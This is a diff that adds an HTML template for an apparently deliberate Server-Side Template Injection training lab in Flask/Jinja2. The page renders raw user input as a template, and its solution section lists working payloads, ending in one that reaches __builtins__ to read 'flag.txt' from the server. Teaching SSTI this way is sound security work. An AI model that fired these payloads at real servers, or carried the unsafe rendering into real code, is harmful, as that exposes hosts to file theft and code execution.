@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>{{ lab.title }}</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;600&family=Source+Sans+Pro:wght@400;500&display=swap"
+    />
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}" />
+  </head>
+  <body>
+    <div class="background-glow"></div>
+    <header class="page-hero">
+      <div>
+        <p class="eyebrow">TryHackMe • OWASP Top 10</p>
+        <h1>{{ lab.title }}</h1>
+        <p class="tagline">{{ lab.tagline }}</p>
+      </div>
+      <div class="hero-card">
+        <p class="hero-label">Fake Flag</p>
+        <p class="hero-flag">{{ lab.fake_flag }}</p>
+        <p class="muted">
+          Can you reach sensitive data by abusing Server-Side Template Injection?
+        </p>
+      </div>
+    </header>
+
+    <main class="layout">
+      <section class="card demo-card">
+        <h2>SSTI Playground</h2>
+        <p>
+          This lab intentionally renders raw user input inside a Jinja2 template using
+          <code>render_template_string</code>. Enter snippets below to observe how
+          template expressions execute on the server.
+        </p>
+        <form method="POST" class="payload-form">
+          <label for="payload" class="label">Payload</label>
+          <textarea
+            id="payload"
+            name="payload"
+            rows="4"
+            placeholder="{{ '{{ 7 * 7 }}' }}"
+          >{{ payload }}</textarea>
+          <button type="submit">Render payload</button>
+        </form>
+
+        {% if error_message %}
+        <div class="status-badge error">
+          <span>Rendering error</span>
+          <p>{{ error_message }}</p>
+        </div>
+        {% endif %}
+
+        <div class="output-panel">
+          <div class="panel-header">
+            <p>Rendered Output</p>
+            <span class="chip">Untrusted • Dangerous</span>
+          </div>
+          <div class="output-body">
+            {% if rendered_output %}
+            {{ rendered_output | safe }}
+            {% else %}
+            <p class="muted">No payload rendered yet. Start with {{ '{{ 7 * 7 }}' }}.</p>
+            {% endif %}
+          </div>
+        </div>
+      </section>
+
+      <aside class="card tips-card">
+        <h2>Notes</h2>
+        <ul>
+          {% for tip in lab.tips %}
+          <li>{{ tip }}</li>
+          {% endfor %}
+        </ul>
+        <div class="status-badge info">
+          <span>Why this is vulnerable</span>
+          <p>
+            User-controlled strings are evaluated as templates. Attackers can reach
+            <code>config</code>, call Python builtins, or leverage objects to
+            access host resources.
+          </p>
+        </div>
+      </aside>
+    </main>
+
+    <section class="card solution-card subtle-card">
+      <div class="solution-header">
+        <p class="label">Need a nudge?</p>
+        <h2>Solution</h2>
+      </div>
+      <details>
+        <summary>Toggle solution</summary>
+        <ol class="solution-steps">
+          <li>
+            <span class="step-title">Prove code execution.</span>
+            Submit <code>{{ '{{ 7 * 7 }}' }}</code> to confirm expressions are evaluated.
+          </li>
+          <li>
+            <span class="step-title">Enumerate context.</span>
+            Use <code>{{ '{{ config.items() }}' }}</code> or
+            <code>{{ '{{ request.__dict__ }}' }}</code> to discover objects exposed to the
+            template.
+          </li>
+          <li>
+            <span class="step-title">Read the flag.</span>
+            Jinja exposes Flask globals, so run
+            <code
+              >{{ "{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}" }}</code
+            >
+            to cat the file on the server.
+          </li>
+        </ol>
+        <div class="status-badge info compact">
+          <span>Why it works</span>
+          <p>
+            <code>request.application</code> leads to Flask internals, letting you reach the raw
+            <code>__builtins__</code> namespace and call <code>open()</code>.
+          </p>
+        </div>
+      </details>
+    </section>
+  </body>
+</html>
+
